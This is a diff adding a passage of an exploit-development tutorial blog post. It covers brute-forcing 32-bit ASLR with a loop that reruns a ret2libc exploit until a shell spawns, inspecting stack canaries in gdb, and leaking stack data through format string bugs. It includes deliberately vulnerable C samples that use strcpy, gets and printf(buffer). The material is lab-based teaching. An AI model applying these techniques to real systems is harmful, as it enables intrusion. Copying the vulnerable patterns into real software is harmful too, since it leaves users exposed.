@@ -114,13 +114,508 @@
             
             
                 <dt>reading time</dt>
-                <dd>0 minutes</dd>
+                <dd>17 minutes</dd>
             
         </dl>
     </section>
     
     <div>
-        
+        <h2 id="2-bypassing-aslr-address-space-layout-randomization">2. Bypassing ASLR (Address Space Layout Randomization):</h2>
+<p>As we discussed earlier, Address Space Layout Randomization, or ASLR, is a security feature designed to make exploitation more difficult by randomizing the memory addresses used by system and application components. Each time a program runs, ASLR repositions critical memory sections, including the stack, heap, libraries, and main executable, to random addresses. ASLR introduces randomness into the memory layout, meaning an exploit that relies on hardcoded addresses will fail unless it can dynamically locate the randomized segments. The core idea is to hinder an attacker from reliably predicting memory addresses for executing ROP (Return-Oriented Programming) chains, shellcode, or jumping to specific functions.</p>
+<p><strong>ASLR Entropy</strong></p>
+<p>The effectiveness of ASLR largely depends on the amount of entropy, or the degree of randomness, available on the platform:</p>
+<ul>
+<li>x86 ASLR Entropy: Due to limitations in address space size, x86 ASLR provides relatively low entropy, making brute-forcing a viable approach. For example:
+<ul>
+<li>Stack and heap addresses may have around 8–16 bits of randomness.</li>
+<li>Shared libraries and the executable base may be randomized within a small 32-bit address range, giving a smaller number of permutations.</li>
+</ul>
+</li>
+<li>x86_64 ASLR Entropy: On 64-bit architectures, there is far greater entropy (28–40 bits or more) in ASLR, making brute-force attacks far more challenging.</li>
+</ul>
+<p><strong>Brute-forcing ASLR on x86</strong></p>
+<p>Due to lower entropy, especially on 32-bit systems, brute-forcing ASLR is sometimes feasible. By repeatedly executing an exploit and adjusting for the randomized addresses, an attacker may eventually guess the correct address layout. In some cases, it can take hundreds or thousands of attempts but is more feasible than on 64-bit systems.</p>
+<p>Enable full randomization on your system:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#ae81ff">2</span> | sudo tee /proc/sys/kernel/randomize_va_space
+</span></span></code></pre></div><p>Now, each time you run binary, ASLR will be applied. Running <code>ldd</code> multiple times illustrates this randomness:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ldd exp2_nx 
+</span></span><span style="display:flex;"><span>	linux-gate.so.1 <span style="color:#f92672">(</span>0xf7f10000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	libc.so.6 <span style="color:#f92672">=</span>&gt; /lib32/libc.so.6 <span style="color:#f92672">(</span>0xf7ca9000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	/lib/ld-linux.so.2 <span style="color:#f92672">(</span>0xf7f12000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ ldd exp2_nx | grep <span style="color:#e6db74">&#34;libc.so.6&#34;</span> 
+</span></span><span style="display:flex;"><span>	libc.so.6 <span style="color:#f92672">=</span>&gt; /lib32/libc.so.6 <span style="color:#f92672">(</span>0xf7c9b000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ ldd exp2_nx | grep <span style="color:#e6db74">&#34;libc.so.6&#34;</span> 
+</span></span><span style="display:flex;"><span>	libc.so.6 <span style="color:#f92672">=</span>&gt; /lib32/libc.so.6 <span style="color:#f92672">(</span>0xf7d3a000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ ldd exp2_nx | grep <span style="color:#e6db74">&#34;libc.so.6&#34;</span> 
+</span></span><span style="display:flex;"><span>	libc.so.6 <span style="color:#f92672">=</span>&gt; /lib32/libc.so.6 <span style="color:#f92672">(</span>0xf7ca1000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>As you can see, only bits 12 to 23 in the address are randomized while the other bits remain constant. This gives about 2<!-- raw HTML omitted -->12<!-- raw HTML omitted --> possible locations (4096 combinations). On older systems, randomness may be reduced to 2<!-- raw HTML omitted -->8<!-- raw HTML omitted -->, or just 256 combinations, allowing for faster brute-forcing attempts.</p>
+<p>Because we know the randomized range, we can attempt the exploit in a loop, hoping to match the randomized <code>libc_base</code> used when the binary is loaded:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#75715e"># I renamed exp3.py to exp4.py</span>
+</span></span><span style="display:flex;"><span>$ <span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span> ./exp2_nx <span style="color:#66d9ef">$(</span>./exp4.py <span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">done</span> 2&gt;/dev/null
+</span></span></code></pre></div><p>After a few seconds, you’ll see the shell spawn, signifying a successful guess! 🎉</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span> ./exp2_nx <span style="color:#66d9ef">$(</span>./exp4.py <span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">done</span> 
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Illegal instruction <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Illegal instruction <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>*** stack smashing detected ***: terminated
+</span></span><span style="display:flex;"><span>Aborted <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Illegal instruction <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>$ pwd
+</span></span><span style="display:flex;"><span>/home/kali/Desktop/Blogs/Materials/x86_exp_dev/03
+</span></span></code></pre></div><h2 id="3-bypassing-stack-canaries">3. Bypassing Stack Canaries:</h2>
+<p>Stack canaries, also known as canary values or stack cookies, are a security mechanism used to prevent buffer overflow attacks, particularly those that target the stack. They act as a safeguard between a buffer and critical control data (like return addresses) on the stack, allowing programs to detect potential overflows before they can be exploited. A canary value is placed on the stack just before the return address of a function. This means that if a buffer overflow occurs, the first data that gets overwritten will typically be the canary.</p>
+<p>Let&rsquo;s compile the following C program with <code>-fstack-protector-all</code> flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">50</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(buff,s);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vuln</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -m32 -fstack-protector-all exp1.c -o exp3_canary
+</span></span></code></pre></div><p>To start, we’ll disable ASLR to simplify our analysis. Now, when we attempt to use our <code>ret2libc</code> exploit (<code>exp4.py</code>) on the binary, we encounter something new:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./exp3_canary <span style="color:#66d9ef">$(</span>./exp4.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>*** stack smashing detected ***: terminated
+</span></span><span style="display:flex;"><span>Aborted <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>The message “Stack smashing detected!” shows that our exploit attempt triggered the stack canary mechanism, designed to prevent buffer overflows from overwriting critical control information on the stack.</p>
+<p>Let’s take a look at the disassembled <code>vuln</code> function to understand what’s happening:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; disass vuln
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> vuln:
+</span></span><span style="display:flex;"><span>   0x0000119d &lt;+0&gt;:	push   ebp
+</span></span><span style="display:flex;"><span>   0x0000119e &lt;+1&gt;:	mov    ebp,esp
+</span></span><span style="display:flex;"><span>   0x000011a0 &lt;+3&gt;:	push   ebx
+</span></span><span style="display:flex;"><span>   0x000011a1 &lt;+4&gt;:	sub    esp,0x54
+</span></span><span style="display:flex;"><span>   0x000011a4 &lt;+7&gt;:	call   0x1250 &lt;__x86.get_pc_thunk.ax&gt;
+</span></span><span style="display:flex;"><span>   0x000011a9 &lt;+12&gt;:	add    eax,0x2e4b
+</span></span><span style="display:flex;"><span>   0x000011ae &lt;+17&gt;:	mov    edx,DWORD PTR <span style="color:#f92672">[</span>ebp+0x8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x000011b1 &lt;+20&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0x4c<span style="color:#f92672">]</span>,edx
+</span></span><span style="display:flex;"><span>   0x000011b4 &lt;+23&gt;:	mov    edx,DWORD PTR gs:0x14
+</span></span><span style="display:flex;"><span>   0x000011bb &lt;+30&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0xc<span style="color:#f92672">]</span>,edx
+</span></span><span style="display:flex;"><span>   0x000011be &lt;+33&gt;:	xor    edx,edx
+</span></span><span style="display:flex;"><span>   0x000011c0 &lt;+35&gt;:	sub    esp,0x8
+</span></span><span style="display:flex;"><span>   0x000011c3 &lt;+38&gt;:	push   DWORD PTR <span style="color:#f92672">[</span>ebp-0x4c<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x000011c6 &lt;+41&gt;:	lea    edx,<span style="color:#f92672">[</span>ebp-0x3e<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x000011c9 &lt;+44&gt;:	push   edx
+</span></span><span style="display:flex;"><span>   0x000011ca &lt;+45&gt;:	mov    ebx,eax
+</span></span><span style="display:flex;"><span>   0x000011cc &lt;+47&gt;:	call   0x1050 &lt;strcpy@plt&gt;
+</span></span><span style="display:flex;"><span>   0x000011d1 &lt;+52&gt;:	add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x000011d4 &lt;+55&gt;:	nop
+</span></span><span style="display:flex;"><span>   0x000011d5 &lt;+56&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp-0xc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x000011d8 &lt;+59&gt;:	sub    eax,DWORD PTR gs:0x14
+</span></span><span style="display:flex;"><span>   0x000011df &lt;+66&gt;:	je     0x11e6 &lt;vuln+73&gt;
+</span></span><span style="display:flex;"><span>   0x000011e1 &lt;+68&gt;:	call   0x1260 &lt;__stack_chk_fail_local&gt;
+</span></span><span style="display:flex;"><span>   0x000011e6 &lt;+73&gt;:	mov    ebx,DWORD PTR <span style="color:#f92672">[</span>ebp-0x4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x000011e9 &lt;+76&gt;:	leave
+</span></span><span style="display:flex;"><span>   0x000011ea &lt;+77&gt;:	ret
+</span></span></code></pre></div><p>In this disassembly, we observe the following key steps involving the stack canary:</p>
+<ol>
+<li>
+<p>Stack Canary Initialization:
+At offset &lt;+30&gt;, the value at <code>gs:0x14</code> (the stack canary) is stored in <code>[ebp-0xc]</code>. This canary acts as a &ldquo;tripwire&rdquo; and is meant to detect buffer overflows.</p>
+</li>
+<li>
+<p>Stack Canary Check:</p>
+<ul>
+<li>At offset &lt;+56&gt;, the canary value at <code>[ebp-0xc]</code> is compared with the original canary value from <code>gs:0x14</code>.</li>
+<li>If they match, it means the stack is intact, and the function proceeds to execute normally.</li>
+<li>If they do not match, the <code>__stack_chk_fail_local</code> function is called at &lt;+68&gt;, which terminates the program with the &ldquo;stack smashing detected&rdquo; error.</li>
+</ul>
+</li>
+</ol>
+<p>As previously discussed, stack canaries generally come in three types:</p>
+<ol>
+<li>Terminator Canaries: These use values that include null characters and other terminators (e.g., <code>0x00</code>, <code>0x0a</code>, <code>0xff</code>). They prevent most string operations from overwriting the canary because these operations stop at these characters.</li>
+<li>Random Canaries: Randomly generated values at runtime make it difficult for attackers to predict or replicate them, enhancing security.</li>
+<li>Random XOR Canaries: These are similar to random canaries but are encoded using XOR operations, providing additional layers of complexity against certain types of attacks.</li>
+</ol>
+<p>Let’s examine the canary type used in our binary. We’ll set a breakpoint at offset &lt;+30&gt; in the <code>vuln</code> function and check the value stored in the <code>edx</code> register, which holds our canary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb ./exp3_canary
+</span></span><span style="display:flex;"><span>pwndbg&gt; b main
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x11f9
+</span></span><span style="display:flex;"><span>pwndbg&gt; run AAAAA
+</span></span><span style="display:flex;"><span>pwndbg&gt; b *vuln + <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">2</span> at 0x565561bb
+</span></span><span style="display:flex;"><span>pwndbg&gt; c
+</span></span><span style="display:flex;"><span>pwndbg&gt; reg edx
+</span></span><span style="display:flex;"><span>*EDX  0xac2a4c00
+</span></span></code></pre></div><p>As we can see, our canary ends with 0x00, indicating it is a <strong>Terminator Canary</strong>. This choice prevents buffer overflows that rely on string operations since they terminate upon encountering 0x00.</p>
+<p>Below diagram beautifully illustrates stack canary.
+<img src="https://squ1rrel.dev/assets/buckeye/ZeroDayTea/canary.webp" alt="stack-canary"></p>
+<p><em>Image Source: <a href="https://squ1rrel.dev/buckeye-stackduck">https://squ1rrel.dev/buckeye-stackduck</a></em></p>
+<p>Stack canaries can be bypassed in a few ways, such as brute-forcing, but a more effective method often involves leveraging information leaks within the binary. By leaking the stack canary, we can incorporate the correct canary value in our payload before overwriting the return address, effectively bypassing stack protections and executing our exploit successfully.</p>
+<p>One of the most common ways to leak a stack canary is through <strong>Format String vulnerabilities</strong>. Let’s explore how format string vulnerabilities work and how we can use them to disclose protected data like stack canaries.</p>
+<h3 id="format-string-vulnerabilities">Format String Vulnerabilities</h3>
+<p>Format string vulnerabilities are a class of security issues that occur when an attacker controls the format string parameter of functions like <code>printf</code>, <code>sprintf</code>, or <code>fprintf</code> without proper validation. These vulnerabilities allow attackers to perform unintended operations, such as reading from or writing to arbitrary memory locations, potentially leading to information leaks or even arbitrary code execution.</p>
+<p>In typical use, a format function call might look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hello, %s!&#34;</span>, username);
+</span></span></code></pre></div><p>Here, <code>%s</code> is the format specifier that expects a string argument, and <code>username</code> provides that argument.</p>
+<p>However, if user-controlled data is passed directly to the format string without validation, as in:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(input);
+</span></span></code></pre></div><p>an attacker could manipulate <code>input</code> to include format specifiers (like <code>%x</code>, <code>%s</code>, or <code>%n</code>) to read or write unintended data. For instance, using <code>%x</code> can leak stack data, which may include sensitive information like function pointers, return addresses, or stack canaries.</p>
+<p>Following are some examples of Format Functions, which if not treated, can expose the application to the Format String Attack.</p>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>fprint</code></td>
+<td>Writes the printf to a file</td>
+</tr>
+<tr>
+<td><code>printf</code></td>
+<td>Output a formatted string</td>
+</tr>
+<tr>
+<td><code>sprintf</code></td>
+<td>Prints into a string</td>
+</tr>
+<tr>
+<td><code>snprintf</code></td>
+<td>Prints into a string checking the length</td>
+</tr>
+<tr>
+<td><code>vfprintf</code></td>
+<td>Prints the <code>va_arg</code> structure to a file</td>
+</tr>
+<tr>
+<td><code>vprintf</code></td>
+<td>Prints the <code>va_arg</code> structure to stdout</td>
+</tr>
+<tr>
+<td><code>vsprintf</code></td>
+<td>Prints the <code>va_arg</code> to a string</td>
+</tr>
+<tr>
+<td><code>vsnprintf</code></td>
+<td>Prints the <code>va_arg</code> to a string checking the length</td>
+</tr>
+</tbody>
+</table>
+<p>Common parameters used in a Format String Attack.</p>
+<table>
+<thead>
+<tr>
+<th>Parameters</th>
+<th>Output</th>
+<th>Passed as</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>%%</code></td>
+<td>% character (literal)</td>
+<td>Reference</td>
+</tr>
+<tr>
+<td><code>%p</code></td>
+<td>External representation of a pointer to void</td>
+<td>Reference</td>
+</tr>
+<tr>
+<td><code>%d</code></td>
+<td>Decimal</td>
+<td>Value</td>
+</tr>
+<tr>
+<td><code>%c</code></td>
+<td>Character</td>
+<td></td>
+</tr>
+<tr>
+<td><code>%u</code></td>
+<td>Unsigned decimal</td>
+<td>Value</td>
+</tr>
+<tr>
+<td><code>%x</code></td>
+<td>Hexadecimal</td>
+<td>Value</td>
+</tr>
+<tr>
+<td><code>%s</code></td>
+<td>String</td>
+<td>Reference</td>
+</tr>
+<tr>
+<td><code>%n</code></td>
+<td>Writes the number of characters into a pointer</td>
+<td>Reference</td>
+</tr>
+</tbody>
+</table>
+<p>Refer:
+<a href="https://owasp.org/www-community/attacks/Format_string_attack">https://owasp.org/www-community/attacks/Format_string_attack</a></p>
+<p>For understanding format string vulnerabilty I want to show you how <code>printf()</code> works.</p>
+<p>Consider the following example program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// gcc -m32 printf_demo.c -o printf_demo
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> num <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,s1,num);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In this code, <code>printf</code> is used to print a string followed by a number. By examining how this works at the assembly level, we can better understand how format specifiers access and interpret arguments on the stack.</p>
+<p>After compiling the program, load it into gdb and set a breakpoint at the <code>printf</code> call:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb ./printf_demo
+</span></span><span style="display:flex;"><span>pwndbg&gt; disass main
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>   0x000011c9 &lt;+60&gt;:	mov    ebx,eax
+</span></span><span style="display:flex;"><span>   0x000011cb &lt;+62&gt;:	call   0x1040 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>   0x000011d0 &lt;+67&gt;:	add    esp,0x10
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>pwndbg&gt; b printf@plt
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x1040
+</span></span><span style="display:flex;"><span>pwndbg&gt; run
+</span></span><span style="display:flex;"><span>pwndbg&gt; stack 
+</span></span><span style="display:flex;"><span>00:0000│ esp 0xffffd58c —▸ 0x565561d0 <span style="color:#f92672">(</span>main+67<span style="color:#f92672">)</span> ◂— add esp, 0x10
+</span></span><span style="display:flex;"><span>01:0004│-028 0xffffd590 —▸ 0x5655700e ◂— <span style="color:#e6db74">&#39;%s %d\n&#39;</span>
+</span></span><span style="display:flex;"><span>02:0008│-024 0xffffd594 —▸ 0x56557008 ◂— <span style="color:#e6db74">&#39;Hello&#39;</span>
+</span></span><span style="display:flex;"><span>03:000c│-020 0xffffd598 ◂— 0xf
+</span></span></code></pre></div><p>At this point, we observe the following stack layout just before <code>printf</code> is executed:</p>
+<ul>
+<li>Return Address: The first item on the stack (<code>esp</code> points here) is the return address (<code>main+67</code>), where execution will continue after <code>printf</code> completes.</li>
+<li>Arguments to <code>printf</code>:
+<ul>
+<li>Format String (<code>&quot;%s %d\n&quot;</code>): The format string <code>%s %d\n</code> is next on the stack. It guides <code>printf</code> on how to interpret the arguments that follow.</li>
+<li>Pointer to String (<code>s1</code>): Following the format string is the pointer to the string <code>&quot;Hello&quot;</code>.</li>
+<li>Integer (<code>num</code>): Finally, the integer <code>num</code> (15) is pushed onto the stack.</li>
+</ul>
+</li>
+</ul>
+<p>When <code>printf</code> executes, it reads arguments in the order they appear in the format string, moving from right to left across the stack. Here’s how it processes each specifier:</p>
+<ol>
+<li><code>%s</code>: The <code>%s</code> format specifier tells <code>printf</code> to expect a string. It locates the first argument after the format string (<code>0x56557008</code>), which is a pointer to <code>&quot;Hello&quot;</code>, and prints the string.</li>
+<li><code>%d</code>: The <code>%d</code> format specifier instructs <code>printf</code> to expect an integer. It moves to the next argument (15 or <code>0xf</code>) and prints it as a decimal number.</li>
+</ol>
+<p>I&rsquo;m sure this diagram I created will help clarify things for you!</p>
+<p><img src="/images/exp-dev/fmt-str.png" alt="format-str"></p>
+<p>Now, imagine if the arguments passed to <code>printf</code> are just <code>&quot;%s %d\n&quot;, s1</code>. In this case, the <code>%s</code> specifier would correctly print the string pointed to by <code>s1</code>, but when <code>printf</code> encounters <code>%d</code>, it expects an integer argument. Since no integer was supplied, <code>printf</code> will instead interpret whatever data is on the stack at that position as an integer and print it in decimal format.</p>
+<p>This discrepancy can lead to unintended behavior, often revealing sensitive stack information if the unintentional data happens to be a valid address or value. This is a key aspect of format string vulnerabilities and demonstrates how improper handling of format specifiers can lead to information leaks.</p>
+<p>Let&rsquo;s do it practically!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// secret.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">secret</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> secret[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;p@ssw0rd!&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">20</span>] ;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gets</span>(buffer);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">secret</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>On compiling and running we can see that the above program is vulnerable to format string bug.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./secret 
+</span></span><span style="display:flex;"><span>%p
+</span></span><span style="display:flex;"><span>0xf7fc6000
+</span></span></code></pre></div><p>Let&rsquo;s load it in gdb and see which data is printed and it was at what location in the stack.</p>
